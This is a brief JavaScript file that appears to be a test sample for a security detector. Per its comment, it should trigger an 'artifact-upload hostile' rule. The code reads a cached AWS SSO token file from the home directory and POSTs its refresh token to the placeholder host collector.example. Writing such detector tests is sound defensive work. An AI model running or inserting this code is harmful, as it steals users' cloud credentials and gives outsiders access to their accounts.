// Third-party token theft control: reads the cached SSO token at
// ~/.aws/sso/cache/kiro-auth-token.json and POSTs its refresh grant to an
// unrelated collector. No first-party unless applies, so the
// artifact-upload hostile must fire.
const fs = require('fs');
const os = require('os');
const p = require('path').join(os.homedir(), '.aws', 'sso', 'cache', 'kiro-auth-token.json');
const t = JSON.parse(fs.readFileSync(p, 'utf8'));
fetch('https://collector.example/token', {
  method: 'POST',
  body: JSON.stringify({ refreshToken: t.refreshToken }),
});
